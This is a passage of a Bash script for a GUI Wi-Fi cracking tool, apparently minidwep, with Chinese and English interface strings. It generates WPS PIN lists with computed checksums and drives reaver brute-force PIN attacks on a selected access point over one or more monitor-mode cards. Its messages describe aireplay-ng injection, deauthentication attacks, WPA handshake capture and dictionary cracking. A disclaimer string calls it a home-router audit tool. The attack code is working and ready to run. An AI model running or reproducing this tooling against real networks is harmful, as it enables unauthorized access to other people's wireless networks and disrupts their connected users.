p3=`echo $figures|cut -c 3`
p4=`echo $figures|cut -c 4`
p5=`echo $figures|cut -c 5`
p6=`echo $figures|cut -c 6`
p7=`echo $figures|cut -c 7`
cks=$[30-3*($p1+$p3+$p5+$p7)-($p2+$p4+$p6)]
cks_last=`echo $cks|awk -F '' '{print $NF}'`
[ $cks -ge 0 ]&&checksum=$cks_last
[ $cks -lt 0 ]&&checksum=$[10-$cks_last]
[ $checksum -eq 10 ]&&checksum=0
pincode=$figures$checksum
figures=`echo $figures|cut -c 1-4`
figures2=`echo $pincode|cut -c 5-7`
[ -z "$figures" ]&&figures="5000"
if [ "$2" = "1" ];then
while [ "$sort_re_w" != "4" ] 
do
	[ "$dialog" = "zenity" ]&&sort_re=`zenity --title="$dg_1" --entry --text="$msg_78" --entry-text="$figures"`
	[ "$dialog" = "Xdialog" ]&&sort_re=`Xdialog --title "$dg_1" --inputbox "$msg_78" 15 50 "$figures" 2>&1`
	[ "$dialog" = "kdialog" ]&&sort_re=`kdialog --title "$dg_1" --inputbox "$msg_78" "$figures"`
	[ -n "$sort_re" ]&&sort_re_w=`expr $sort_re : '[0-9][0-9][0-9][0-9]$'`
	if [ "$sort_re_w" = "4" ];then
		i=$sort_re
		ii=1
		l=0
		g=0
		io=$i
		[ ${#i} -eq 1 ]&&io="000$i"			
		[ ${#i} -eq 2 ]&&io="00$i"			
		[ ${#i} -eq 3 ]&&io="0$i"
		echo "0">$wpc_na
		echo "0">>$wpc_na
		echo "0">>$wpc_na
		echo $io>>$wpc_na 
		i=`echo $i|sed 's/^0//g'`
		i=`echo $i|sed 's/^0//g'`
		i=`echo $i|sed 's/^0//g'`
		while [ $l -ge 0  -o $g -le 9999 ]
		do
			l=$[$i-$ii]
			g=$[$i+$ii]
			if [ $l -ge 0 ];then	
				l_out=$l
				[ ${#l} -eq 1 ]&&l_out="000$l"			
				[ ${#l} -eq 2 ]&&l_out="00$l"			
				[ ${#l} -eq 3 ]&&l_out="0$l"
				echo "$l_out">>$wpc_na	
			fi
			if [ $g -le 9999 ];then	
				g_out=$g
				[ ${#g} -eq 1 ]&&g_out="000$g"			
				[ ${#g} -eq 2 ]&&g_out="00$g"			
				[ ${#g} -eq 3 ]&&g_out="0$g"
				echo "$g_out">>$wpc_na	
			fi
			ii=$[$ii+1]
		done
		make_three_spec $wpc_na $figures2
		[ "$dialog" = "zenity" ]&&zenity --info --title="$dg_1" --text="$msg_76\n$wpc_na"&
		[ "$dialog" = "Xdialog" ]&&Xdialog --title "$dg_1"  --msgbox  "$msg_76\n$wpc_na" 10 20&
		[ "$dialog" = "kdialog" ]&&kdialog --title "$dg_1"  --msgbox  "$msg_76\n$wpc_na"&			
		break;
	fi
done
fi
fi
if [ "$2" = "2" ];then
	seq_wpc="seq_wpc"
	rm -rf $seq_wpc
	make_four 0 9999 $seq_wpc
	date_s=`date +%s`
	[ "$dialog" = "zenity" ]&&zenity --info --title="$dg_1-$date_s" --text="$msg_79"&
	[ "$dialog" = "Xdialog" ]&&Xdialog --title "$dg_1-$date_s"  --msgbox  "$msg_79" 10 20&
	[ "$dialog" = "kdialog" ]&&kdialog --title "$dg_1-$date_s"  --msgbox  "$msg_79" 10 20&
	echo "0">$wpc_na
	echo "0">>$wpc_na
	echo "0">>$wpc_na
	echo "$figures">>$wpc_na
	amount_l=`wc -l $seq_wpc|awk '{print $1}'`
	while [ $amount_l -gt 0 ]
	do
		random_l=$[$RANDOM%amount_l+1]
		out_figures=`awk '{if(NR=='$random_l')print}' $seq_wpc`
		[ "$figures" != "$out_figures" ]&&echo $out_figures>>$wpc_na
		sed -i "${random_l}d" $seq_wpc
		amount_l=`wc -l $seq_wpc|awk '{print $1}'`
	done
	echo "$figures2">>$wpc_na
	rm -rf $seq_wpc
	make_three $seq_wpc
	amount_l=`wc -l $seq_wpc|awk '{print $1}'`
	while [ $amount_l -gt 0 ]
	do
		random_l=$[$RANDOM%amount_l+1]
		out_figures=`awk '{if(NR=='$random_l')print}' $seq_wpc`
		[ "$figures2" != "$out_figures" ]&&echo $out_figures>>$wpc_na
		sed -i "${random_l}d" $seq_wpc
		amount_l=`wc -l $seq_wpc|awk '{print $1}'`
	done
	rm -rf $seq_wpc
	if [ -n "`ps --help 2>&1|grep BusyBox|grep -v grep`" ];then
		kill `ps -ef|grep $dg_1-$date_s|awk '{print$1}'`
	else
		kill `ps -ef|grep $dg_1-$date_s|awk '{print$2}'`
	fi	
	[ "$dialog" = "zenity" ]&&zenity --info --title="$dg_1" --text="$msg_76\n$wpc_na"&
	[ "$dialog" = "Xdialog" ]&&Xdialog --title "$dg_1"  --msgbox  "$msg_76\n$wpc_na" 10 20&
	[ "$dialog" = "kdialog" ]&&kdialog --title "$dg_1"  --msgbox  "$msg_76\n$wpc_na"&			
	break;
fi
}
function multi_reaver()
{
rm -f $path/multi_no
date_s=`date +%s`
echo $date_s>$path/tl
[ "$dialog" = "zenity" ]&&zenity --info --title="$dg_1-$date_s" --text="$msg_72"&
[ "$dialog" = "Xdialog" ]&&Xdialog --title "$dg_1-$date_s"  --msgbox  "$msg_72" 10 20&
[ "$dialog" = "kdialog" ]&&kdialog --title "$dg_1-$date_s"  --msgbox  "$msg_72" 10 20&
echo "">$path/xd
lang=$LANG
export LANG=en
interface_sel=`tail -1 $path/interface_sel`
if [ ! -e $path/interfaces_mons ];then 
airmon-ng |grep -v 'Interface' |grep -v '^$' |awk '{print$1}' >$tmp
while read line
do
	airmon-ng stop ${line}
done <$tmp
airmon-ng |grep -v 'Interface' |grep -v '^$' |awk '{print$1}' >$tmp1
while read line
do
	airmon-ng >$tmp
	interface_amount_normal=`wc -l $tmp|awk '{print $1}'`
	echo "interface_amount_normal is $interface_amount_normal"
	interface="${line}"
	ifconfig $interface up
	airmon-ng start $interface
	#airmon-ng |grep -v 'Interface' |grep -v '^$' |awk '{print$1}' >$path/interface
	#monitor=$(tail -1 $path/interface)
	airmon-ng >$tmp2
	monitor=$(diff $tmp2 $tmp|tail -1|awk '{print$2}')
	interface_amount_mon=`wc -l $tmp2|awk '{print $1}'`
	echo "interface_amount_mon is $interface_amount_mon"
	if [ "$interface_amount_normal" = "$interface_amount_mon" ];then
		monitor=$interface
	fi
	echo "${line} $monitor" >>$path/interfaces_mons
done<$tmp1
fi
export LANG=$lang
rm -f $path/mons_on
while read line
do 
	mon=`echo ${line}|awk '{print$2}'`
	mon_on=`ps -ef|grep reaver|grep $mon|grep -v grep|tail -1`
	mon_on1=`ps -ef|grep airodump-ng|grep $mon|grep -v grep|tail -1`
	[ -n "$mon_on" -o -n "$mon_on1" ]&&echo "${line} on">>$path/mons_on||echo "${line} off">>$path/mons_on
done<$path/interfaces_mons
ap_mac=$(cat $path/ap_mac)
ap_mac_pinning=`ps -ef|grep reaver|grep $ap_mac|grep -v grep`
ap_mac_airodump=`ps -ef|grep airodump-ng|grep $ap_mac|grep -v`
if [ -z "$ap_mac_pinning" ];then
interfaces_total=`cat $path/interfaces_mons|awk '{print$1}'|wc -l`
interfaces_used=`cat $path/mons_on|awk '{if($3=="on")print$0}'|wc -l`
interfaces_unused=`cat $path/mons_on|awk '{if($3=="off")print$0}'|wc -l`
#wmctrl -c "$dg_1-$date_s"
if [ -n "`ps --help 2>&1|grep BusyBox|grep -v grep`" ];then
	kill `ps -ef|grep $dg_1-$date_s|awk '{print$1}'`
else
	kill `ps -ef|grep $dg_1-$date_s|awk '{print$2}'`
fi

if [ $interfaces_unused -ge 1 ];then
	tl="$dg_1-`date +%s`"
	echo $tl>$path/tl
	[ "$dialog" = "zenity" ]&&multi_yes=`zenity --list --radiolist --title="$tl" --text="$interfaces_total $msg_66a \
$interfaces_used $msg_67\n$msg_68" --column="" --column="" true "Yes" "" "No"`
	[ "$dialog" = "Xdialog" ]&&multi_yes=`Xdialog --title "$tl" --radiolist "$interfaces_total $msg_66a \
$interfaces_used $msg_67\n$msg_68 " 15 25 8 "Yes" "" on  "No" "" off 2>&1`
	[ "$dialog" = "kdialog" ]&&multi_yes=`kdialog --title "$tl" --radiolist "$interfaces_total $msg_66a 
$interfaces_used $msg_67,$msg_68"  "Yes" "Yes" on  "No" "No" off`
	if [ "$multi_yes" = "Yes" ];then
		cat $path/mons_on|awk '{if($3=="off")print$1}' >$tmp
		if [ `wc -l $tmp|awk '{print$1}'` -gt 1 ];then
			interfaces=""
			while read line
			do
				interfaces=$interfaces" "${line}
				interfaces_Xdialog=$interfaces_Xdialog" "${line}" "card
				interfaces_kdialog=$interfaces_kdialog" "${line}" "${line}
			done<$tmp
			[ "$dialog" = "zenity" ]&&interface_multi_sel=`zenity --list --title="$dg_1" --text="$msg_69"\
 --column="Interface" $interfaces`
			[ "$dialog" = "Xdialog" ]&&interface_multi_sel=`Xdialog --title "$dg_1" --menubox "$msg_69"\
 15 20 5 $interfaces_Xdialog 2>&1`
			[ "$dialog" = "kdialog" ]&&interface_multi_sel=`kdialog --title "$dg_1" --menu "$msg_69"\
 $interfaces_kdialog `
			if [ -n "$interface_multi_sel" ];then
				cat $path/interfaces_mons|grep $interface_multi_sel|awk '{print$2}'>$path/interface_mon
			else
				cat $path/interfaces_mons|grep $interface_sel|awk '{print$2}'>$path/interface_mon
				echo "">$path/multi_no
			fi
		else
			cat $path/mons_on|awk '{if($3=="off")print$2}'>$path/interface_mon
		fi
	else
		if [ $interfaces_used -eq 0 ];then
			cat $path/interfaces_mons|grep $interface_sel|awk '{print$2}'>$path/interface_mon
		else
			echo "">$path/multi_no
		fi
	fi
else
#	wmctrl -c "$dg_1-$date_s"
	if [ -n "`ps --help 2>&1|grep BusyBox|grep -v grep`" ];then
		kill `ps -ef|grep $dg_1-$date_s|awk '{print$1}'`
	else
		kill `ps -ef|grep $dg_1-$date_s|awk '{print$2}'`
	fi
	cat $path/interfaces_mons|grep $interface_sel|awk '{print$2}'>$path/interface_mon
	echo "">$path/multi_no
	[ "$dialog" = "zenity" ]&&zenity --info --title="$dg_1" --text="$msg_70"
	[ "$dialog" = "Xdialog" ]&&Xdialog --title "$dg_1" --msgbox  "$msg_70" 10 20
	[ "$dialog" = "kdialog" ]&&kdialog --title "$dg_1" --msgbox  "$msg_70"
	rm -f $path/disable_scan_button $path/disable_reaver
	[ -z "$ap_mac_airodump" ]&&rm -f $path/disable_lanch||echo "">$path/disable_lanch
fi
else
	#wmctrl -c "$dg_1-$date_s"
	if [ -n "`ps --help 2>&1|grep BusyBox|grep -v grep`" ];then
		kill `ps -ef|grep $dg_1-$date_s|awk '{print$1}'`
	else
		kill `ps -ef|grep $dg_1-$date_s|awk '{print$2}'`
	fi
	[ "$dialog" = "zenity" ]&&zenity --info --title="$dg_1" --text="$msg_71"
	[ "$dialog" = "Xdialog" ]&&Xdialog --title "$dg_1" --msgbox "$msg_71" 10 20 
	[ "$dialog" = "kdialog" ]&&kdialog --title "$dg_1" --msgbox "$msg_71"  
	cat $path/interfaces_mons|grep $interface_sel|awk '{print$2}'>$path/interface_mon
	echo "">$path/multi_no
	rm -f $path/disable_scan_button $path/disable_reaver
	[ -z "$ap_mac_airodump" ]&&rm -f $path/disable_lanch||echo "">$path/disable_lanch
fi
rm -f $path/xd
}
function reaver_attack()
{
#$apmac $apname $apchannel $apclientmac $monitor
ap_mac=$(cat $path/ap_mac)
cat $path/aps_clients|grep -a "$ap_mac"|awk '{print$6}'>$tmp
cat $tmp|awk -F - '{print $2}'>$path/client_mac
client_mac=$(head -1 $path/client_mac)
echo "client_mac is $client_mac"
cat $path/aps_clients|grep -a "$ap_mac"|awk '{print$4}'>$tmp
cat $tmp|awk -F - '{print "channel "$2}'>$path/ch
ch=$(head -1 $path/ch|awk '{print$2}')
[ "$ch" = "108" ]&&ch="1"
[ "$ch" = "113" ]&&ch="2"
[ "$ch" = "118" ]&&ch="3"
[ "$ch" = "123" ]&&ch="4"
[ "$ch" = "128" ]&&ch="5"
[ "$ch" = "133" ]&&ch="6"
[ "$ch" = "138" ]&&ch="7"
[ "$ch" = "143" ]&&ch="8"
[ "$ch" = "148" ]&&ch="9"
[ "$ch" = "153" ]&&ch="10"
[ "$ch" = "158" ]&&ch="11"
[ "$ch" = "163" ]&&ch="12"
[ "$ch" = "168" ]&&ch="13"
[ "$ch" = "173" ]&&ch="14"
lang=$LANG
export LANG=en
interface_total=`airmon-ng |grep -v 'Interface' | grep -v 'mon\w*' |grep -v '^$'|grep -v "parent"|awk '{print$1}'|wc -l`
export LANG=$lang
if [ $interface_total -gt 1 ];then
	multi_reaver
	[ -e $path/multi_no ]&&return
fi
ap_mac_pinning=`ps -ef|grep reaver|grep $ap_mac|grep -v grep`
monitor=`head -1 $path/interface_mon`
if [ -n "$ap_mac_pinning" ];then
	[ "$dialog" = "zenity" ]&&zenity --info --title="$dg_1" --text="$msg_71"
	[ "$dialog" = "Xdialog" ]&&Xdialog --title "$dg_1" --msgbox "$msg_71" 10 20 
	[ "$dialog" = "kdialog"	]&&kdialog --title "$dg_1" --msgbox "$msg_71" 
	rm -f $path/disable_scan_button $path/disable_reaver
	[ ! -e $path/air_na ]&&rm -f $path/disable_lanch||echo "">$path/disable_lanch
	return
fi
if [ -n "`ps -ef|grep reaver|grep $monitor|grep -v grep`" ];then
	[ "$dialog" = "zenity" ]&&zenity --info --title="$dg_1" --text="$msg_70"
	[ "$dialog" = "Xdialog" ]&&Xdialog --title "$dg_1" --msgbox  "$msg_70" 10 20
	[ "$dialog" = "kdialog" ]&&kdialog --title "$dg_1" --msgbox  "$msg_70" 
	rm -f $path/disable_scan_button $path/disable_reaver
	[ ! -e $path/air_na ]&&rm -f $path/disable_lanch||echo "">$path/disable_lanch
	return
fi
p6=`cat $path/aps|grep -a "$ap_mac"|awk '{print $6}'`
p7=`cat $path/aps|grep -a "$ap_mac"|awk '{print $7}'`
p8=`cat $path/aps|grep -a "$ap_mac"|awk '{print $8}'`
p9=`cat $path/aps|grep -a "$ap_mac"|awk '{print $9}'`
[ -n "$p6" ]&&ap_name=$p6
[ -n "$p7" ]&&ap_name=$p6"_"$p7
[ -n "$p8" ]&&ap_name=$p6"_"$p7"_"$p8
[ -n "$p9" ]&&ap_name=$p6"_"$p7"_"$p8"_"$p9
[ -z "$ap_name" ]&&ap_name="unknown"
stdout "`now_time`$msg_64" 
cd $path
rm -f $path/scan*
if [ "$ch" = "1" -o "$ch" = "2" -o "$ch" = "3" -o "$ch" = "4" -o "$ch" = "5" -o "$ch" = "6" -o "$ch" = "7" -o "$ch" = "8" -o "$ch" = "9" -o "$ch" = "10" -o "$ch" = "11" -o "$ch" = "12" -o "$ch" = "13" -o "$ch" = "14" ]
then
	ap_mac_wpc=`echo $ap_mac|tr -d :`".wpc"
	echo $ap_mac_wpc
	if [ ! -e $path/$ap_mac_wpc ];then
		if [ $distro = "CDlinux" ];then 
			[ -s $HOME/$ap_mac_wpc ]&&cp -f $HOME/$ap_mac_wpc $path
		fi
		[ -s $reaver_wpc_path/$ap_mac_wpc ]&&cp -f $reaver_wpc_path/$ap_mac_wpc $path
	fi
	term=`cat $path/term`
	if [ -s $path/$ap_mac_wpc ];then
		reaver_c0="reaver -i $monitor -b $ap_mac -c $ch -s $path/$ap_mac_wpc"
	else
		reaver_c0="reaver -i $monitor -b $ap_mac -c $ch"
	fi
	reaver_c2="-a -v -S -x 2 -r 100:2 -l 2"
	tl=$dg_1-"`date +%s`"
	echo $tl>$path/tl
	[ "$dialog" = "Xdialog" ]&&reaver_c1=`Xdialog --title "$tl" --inputbox "$msg_65\n$reaver_c0" 10 50 "$reaver_c2" 2>&1`
	[ "$dialog" = "zenity" ]&&reaver_c1=`zenity --entry --title="$tl" --text="$msg_65\n$reaver_c0" --entry-text="$reaver_c2"`
	[ "$dialog" = "kdialog" ]&&reaver_c1=`kdialog --title "$tl" --inputbox "$msg_65 $reaver_c0" `

	if [ -z "$reaver_c1" ];then
		reaver_command="$reaver_c0"" ""$reaver_c2"
	else
		reaver_command="$reaver_c0"" ""$reaver_c1"  
	fi
	[ -s $path/interfaces_mons ]&&interface_sel=`cat $path/interfaces_mons|grep $monitor|awk '{print$1}'`||interface_sel=`tail -1 $path/interface_sel`
	#to skip auto_pin at first attempt
	echo "">$path/$interface_sel"-pin1"
	geox=$[$RANDOM%601]
	geoy=$[$RANDOM%501]
	if [ "$term" = "xterm" ];then
		$term -title "$interface_sel $monitor $ap_name $ap_mac" -geometry 80x24+$geox+$geoy -e bash -c -x "$reaver_command -C '$reaver_sh_path/reaver_sh $ap_mac.log' 2>&1|tee $path/$ap_mac.log"&
	else
		$term  --title "$interface_sel $monitor $ap_name $ap_mac" -geometry 80x24+$geox+$geoy -e bash -c -x "$reaver_command -C '$reaver_sh_path/reaver_sh $ap_mac.log' 2>&1|tee $path/$ap_mac.log"&
	fi
fi
rm -f $path/disable_scan_button $path/disable_reaver
}
function auto_pin_macs ()
{
	#$1  $card_selected $2 mac_default
	[ -s $path/aps_wps ]||return
	macs_list=""
	i="False"
	j="off"
	while read line
	do
		ap_mac=`echo ${line}|awk -F_ '{print$1}'`
		ap_others=`echo ${line}|awk -F $ap_mac '{$1="";print $0}'`
		if [ "$ap_mac" = "$2" ];then 
			i="True"
			j="on"
		else
			 i="False"
			j="off"	
		fi
		if [ -e $path/auto_wps_$1 ];then
			if [ -n "`cat $path/auto_wps_$1|grep $ap_mac`" ];then
				i="True"
				j="on"
			fi
		fi
		macs_list=$macs_list" "$i" "$ap_mac" "$ap_others" "
		macs_list_Xdialog=$macs_list_Xdialog" "$ap_mac" "$ap_others" "$j" "
		macs_list_kdialog=$macs_list_kdialog" "$ap_mac" "${line}" "$j" "
	done <$path/aps_wps
	tl=$dg_1-"`date +%s`"
	echo $tl>$path/tl
	[ "`cat $path/dialog`" = "zenity" ]&&zenity --title="$tl" --height=400 --width=600 --list  --text="$msg_80" --checklist --column="" --column="MAC" --column="Info" $macs_list>$path/tmp
	[ "`cat $path/dialog`" = "Xdialog" ]&&Xdialog --title "$tl" --checklist "$msg_80" 30 50 20 $macs_list_Xdialog 2>$path/tmp
	[ "`cat $path/dialog`" = "kdialog" ]&&kdialog --title "$tl" --checklist "$msg_80" $macs_list_kdialog >$path/tmp
	macs=`cat $path/tmp`
	if [ -n "$macs" ];then
		i=1
		while read line
		do
			mac=`echo ${line}|awk '{print$1}'`
			if [ -n "`echo $macs|grep "$mac"`" ];then
				[ "$i" = "1" ]&&echo $mac" "$i>$path/auto_wps_$1||echo $mac" "$i>>$path/auto_wps_$1 
				i=$[$i+1]
			fi
		done<$path/aps
		echo "">$path/auto_pin_$1
	fi
}
function minicopy()
{
#$1 is the name of file

[ -z "$1" ]&&return
if [ -s "$path/dialog" ];then
	dialog=`cat $path/dialog`
fi
file_name="$1"
media=(`ls /media`) 2>&1 >/dev/null
media_amount=${#media[*]}
mnt=(`ls /mnt`) 2>&1 >/dev/null
mnt_amount=${#mnt[*]}
dir_name="/mnt"
[ $media_amount -gt $mnt_amount ]&&dir_name="/media"
[ -n "`cat $path/dialog|grep "Xdialog"`" ]&&\
Xdialog --title "$dg_1" --radiolist "$dg_18" 12 40 8 "Yes" "" on  "No" "" off 2>$tmp_yesno
[ -n "`cat $path/dialog|grep "zenity"`" ]&&\
zenity --list --radiolist --title="$dg_1" --text="$dg_18"  --column="" --column=""  true "Yes" "" "No" >$tmp_yesno
[ -n "`cat $path/dialog|grep "kdialog"`" ]&&\
kdialog --title "$dg_1" --radiolist "$dg_18"  "Yes" "Yes" on  "No" "No" off >$tmp_yesno
yesno=`cat $tmp_yesno`
[ "$yesno" != "Yes" ]&&return
while true
do
	[ "$dialog" = "Xdialog" ]&&Xdialog --title "$dg_7" --fselect "$file_name" 30 60 2>$tmp
	[ "$dialog" = "kdialog" ]&&kdialog --title "$dg_7" --getopenfilename "$file_name" >$tmp
	[ "$dialog" = "zenity" ]&&zenity --file-selection --title="$dg_7" --filename="$file_name" >$tmp
	file_name=`tail -1 $tmp`
	[ -z "$file_name" ]&&break
	file=`echo $file_name|awk -F / '{print $NF}'`
	if [ -n "$file_name" -a -e "$file_name" ];then
		[ "$dialog" = "Xdialog" ]&&Xdialog --title "$dg_13" --dselect "$dir_name" 30 50 2>$tmp
		[ "$dialog" = "kdialog" ]&&kdialog --title "$dg_13" --getexistingdirectory "$dir_name" >$tmp
		[ "$dialog" = "zenity" ]&&zenity --file-selection --title="$dg_13" --directory --filename="$dir_name" >$tmp
		dir_name=`tail -1 $tmp`
		if [ -d "$dir_name" -a ! -d "$dir_name/$file" ];then
			f_na=`echo $file_name|awk -F . '{print $1}'`
			#cp -f $file_name $dir_name 2>&1 >/dev/null
			cp -f $f_na* $dir_name 2>&1 >/dev/null
			if [ -e "$dir_name/$file" ];then
				[ "$lang" = "zh" ]&&dg_14="file:$file_name \n已经成功拷贝到\n$dir_name"||dg_14="file:$file_name \nhas copied successfully to\n$dir_name"
				[ "$dialog" = "Xdialog" ]&&Xdialog --title "minicopy: message" --msgbox "$dg_14"  10 40
				[ "$dialog" = "kdialog" ]&&kdialog --title "minicopy: message" --msgbox "$dg_14"
				[ "$dialog" = "zenity" ]&&zenity --title="minicopy: message" --info --text="$dg_14"
				else
				[ "$dialog" = "Xdialog" ]&&Xdialog --title "minicopy: message" --msgbox "$dg_15" 7 40
				[ "$dialog" = "kdialog" ]&&kdialog --title "minicopy: message" --msgbox "$dg_15"
				[ "$dialog" = "zenity" ]&&zenity --title="minicopy: message" --info --text="$dg_15"
			fi
			break
		else
			[ "$dialog" = "Xdialog" ]&&Xdialog --title "minicopy: message" --msgbox "$dg_16" 7 40
			[ "$dialog" = "kdialog" ]&&kdialog --title "minicopy: message" --msgbox "$dg_16" 
			[ "$dialog" = "zenity" ]&&zenity --title="minicopy: message" --info --text="$dg_16" 
			break
		fi
	else
		[ -n "`cat $path/dialog|grep "Xdialog"`" ]&&\
		Xdialog --title "$dg_1" --radiolist "$dg_17" 12 40 8 "Yes" "" on  "No" "" off 2>$tmp_yesno
		[ -n "`cat $path/dialog|grep "zenity"`" ]&&\
		zenity --list --radiolist --title="$dg_1" --text="$dg_17"  --column="" --column=""  true "Yes" "" "No" >$tmp_yesno
		[ -n "`cat $path/dialog|grep "kdialog"`" ]&&\
		kdialog --title "$dg_1" --radiolist "$dg_17"  "Yes" "Yes" on  "No" "No" off >$tmp_yesno
		yesno=`cat $tmp_yesno`
		[ "$yesno" != "Yes" ]&&break
	fi 

done
rm -f $tmp
}
# Start gtk-server in FIFO mode
if [ ! -e /usr/lib/libssl.so.0 -a ! -e /usr/local/lib/libssl.so.0 ];then
	libssl=`find /usr -name libssl.so.*|tail -1`
	[ -n  "$libssl" ]&&ln -sf $libssl /usr/lib/libssl.so.0
	ldconfig
fi
if [ ! -e /usr/lib/libcrypto.so.0 -a ! -e /usr/local/lib/libcrypto.so.0 ];then
	libcrypto=`find /usr -name libcrypto.so.*|tail -1`
	[ -n  "$libcrypto" ]&&ln -sf $libcrypto /usr/lib/libcrypto.so.0
	ldconfig
fi
gtk-server -fifo=$PI -log=/tmp/$0.log &
while [ ! -p $PI ]; do continue; done
mkdir -p /tmp/minidwep
path="/tmp/minidwep"
chmod -R 777 $path
reaver_sh_path="/usr/local/bin/minileafdwep"
echo $me_edition>$path/version
del_wpa_files
tmp="$path/tmp"
tmp1="$path/tmp1"
tmp2="$path/tmp2"
tmp_2="$path/tmp_2"
tmp_3="$path/tmp_3"
tmp_6="$path/tmp_6"
tmp_7="$path/tmp_7"
tmp_yesno="$path/tmp_yesno"
tmp_abstract="$path/tmp_abstract"
tmp_stdout="$path/tmp_stdout"
tmp_card="$path/tmp_card"
stdout="$path/stdout"
reaver_wpc_path="/usr/local/etc/reaver"
[ ! -d $path/pass ]&&mkdir -p $path/pass
no_one=""
[ -n "`airodump-ng |grep "ignore-negative-one"`" ]&&no_one="--ignore-negative-one"
cd $path
monitor_stop
#distro="CDlinux"
#distro="slax"
#distro="BT3"
distro="BT4"
#distro="ubuntu"
#distro="TinyCore"
echo $distro>$path/distro
if [ -s /bin/zenity -o -s /usr/bin/zenity -o -s /usr/local/bin/zenity ];then
	echo "zenity">$path/dialog
elif [ -s /bin/kdialog -o -s /usr/bin/kdialog -o -s /usr/local/bin/kdialog ];then 
	echo "kdialog">$path/dialog
elif [ -s /bin/Xdialog -o -s /usr/bin/Xdialog -o -s /usr/local/bin/Xdialog ];then 
	echo "Xdialog">$path/dialog
else
	echo "No zenity , kdailog , Xdialog found "
	exit
fi
#echo "Xdialog" >$path/dialog
if [ -s /bin/urxvt -o -s /usr/bin/urxvt -o -s /usr/local/bin/urxvt ];then
	echo "urxvt">$path/term
elif [ -s /bin/xterm -o -s /usr/bin/xterm -o -s /usr/local/bin/xterm ];then 
	echo "xterm">$path/term
elif [ -s /bin/aterm -o -s /usr/bin/aterm -o -s /usr/local/bin/aterm ];then 
	echo "aterm">$path/term
else
	echo "No urxvt , xterm , aterm found "
	exit
fi
[ "$distro" = "TinyCore" ]&&echo "aterm" >$path/term
if [ -n "`which tazhw`" ];then
	tazhw detect-usb
	tazhw detect-pci
	[ -n "`lsmod |grep ssb`" ]&&sudo modprobe b43 
fi
cat $path/dialog
cat $path/term
echo "" >$path/me
echo "">$path/first_scan
echo $LANG
lang5=`echo $LANG|cut -c1-2`
#[ "$LANG" = "zh_CN.UTF-8" -o "$LANG" = "zh_CN.utf8" ]&&lang="zh"
[ "$lang5" = "zh" ]&&lang="zh"
if [ "$lang" = "zh" ];then
msg_1="无线网卡"
msg_2="信道"
msg_3="加密方式"
msg_4="路由MAC"
msg_5="名称"
msg_6="强度"
msg_7="信道"
msg_8="加密方式"
msg_9="客户端MAC"
msg_10="方式选择"
msg_11="注入速率"
msg_12="等待命令中"
msg_13="_D跑字典"
msg_14="没有发现无线网卡!"
msg_14a="没有发现WEP或WPA加密的无线路由"
msg_15="请选择一个路由"
msg_16="请选择一个以WEP加密的路由"
msg_17="请选择一个以WPA加密的路由!"
msg_17a="IVS数量:"
msg_18="发送WEP认证请求"
msg_19="虚拟连接不成功!"
msg_20="虚拟连接成功！"
msg_21="虚拟连接不成功!开始抓包,等待客户端连接"
msg_22="启动aireplay-ng -2 -p 0841"
msg_22a="Aireplay-ng -2 -p 0841成功,开始注入..."
msg_23="启动aireplay-ng -3"
msg_23a="Aireplay-ng -3成功,开始注入..."
msg_24="启动aireplay-ng -4,请等待"
msg_25="aireplay-ng -4失败"
msg_26="Aireplay-ng -4 已取得replay_dec.xor文件!开始注入..."
msg_27="启动aireplay-ng -5"
msg_28="aireplay-ng -5失败"
msg_29="Aireplay-ng -5 已取得fragment.xor文件! 开始注入..."
msg_30="启动aireplay-ng -6"
msg_30a="Aireplay-ng -6 开始注入..."
msg_31="启动aireplay-ng -7"
msg_31a="Aireplay-ng -7开始注入..."
msg_32="找到[$ap_mac]密码: $he"
msg_33="等待WPA握手包... "
msg_34="目标AP隐藏了essid,尝试虚拟连接"
msg_35="等待$ap_mac的握手包"
msg_36="WPA握手包捕获!"
msg_37="找到WPA密码: $key"
msg_38="等待客户端连接..."
msg_39="等待$sec秒以便获得认证握手包!"
msg_40="没有抓到握手包,等待60秒"
msg_41="抓到一个客户端MAC"
msg_42="找到[$ap_mac]的WPA密码:$key"
msg_43="在你的字典中没有发现密码"
msg_44="开始寻找密码..."
msg_45="启动aircrack-ng搜寻密码..."
msg_46="准备启动deauthentication以便aireplay-ng -3获得ARP包"
msg_47="没有发现客户端"
msg_48="启动Deauthentication attack..."
msg_49="等待ARP包"
msg_50="握手包文件:/tmp/$cap_name"
msg_51="已启动aircrack-ng,搜寻字典中的密码"
msg_52="aircrack-ng已经退出"
msg_53="没有选择字典" 
msg_54="启动Deauthentication" 
msg_55="请等待"
msg_56="没有在信道$ch发现$wep_wpa加密的无线路由"
msg_57="本软件是家用无线路由器安全审计之工具\n切勿用于非法行为\n盗用他人无线网络涉嫌违法\n丢弃WEP加密，使用WPA2加密\n关闭路由WPS"
msg_58="发现客户端MAC，等待60秒"
msg_59="尝试虚拟连接中"
msg_60="启动虚拟连接命令"
msg_61="虚拟连接失败"
msg_62="没有发现aircrack-ng,请先安装aircrack-ng! "
msg_63="信道值不正确，点击停止，重新扫描！"
msg_64="尝试pin中"
msg_65="请在下面方框中填入reaver可选参数："
msg_66="没有发现reaver1.4或更高版本，请安装！"
msg_66a="张无线网卡找到，"
msg_67="张使用中，"
msg_68="同时Pin多个AP吗？"
msg_69="选择一个网卡："
msg_70="已使用了所有的无线网卡!"
msg_71="AP正在被Pin中!"
msg_72="设置无线网卡中，请等待！"
msg_73="排序pin码"
msg_74="文件存在，覆盖吗?"
msg_75="可排序pin码,请输入10位数字.\n0代表0000-0999,1代表1000-1999.\n请在下面输入数字:"
msg_75k="可排序pin码,请输入10位数字.0代表0000-0999,1代表1000-1999.请在下面输入数字:"
msg_76="wpc文件已生成于:"
msg_77="所选网卡已使用，请选择另外的网卡!"
msg_78="请输入4位数字，排序方式n n-1 n+1 n-2 n+2..."
msg_79="乱序排列pin码中，耗时5-10分钟或更多，请稍候！"
msg_80="请选择需要自动pin的AP,\n确定后点击主界面Reaver按键开始自动pin."
dg_1="$me_edition"
dg_2="已取得WPA握手包.  选择一个字典搜寻密码吗?"
dg_3="没有选择任何字典! \nWPA握手包文件在这里:\n/tmp/$cap_name"
dg_4="_Reaver"
dg_5="选取一个字典文件"
dg_6="在字典中没有发现密码! \nWPA握手包文件在这里:\n/tmp/$cap_name "
dg_7="选择需要拷贝的文件"
dg_8="不是有效的cap文件!"
dg_9="选择一个MAC地址"
dg_10="无效文件!"
dg_11="选择你的字典文件" 
dg_12="发现WPA密码"
dg_13="选择一个目录"
dg_14="file:$file_name \n已经成功拷贝到\n$dir_name"
dg_15="拷贝失败"
dg_16="选择了无效目录" 
dg_17="无效文件! \n重新选择文件吗?"
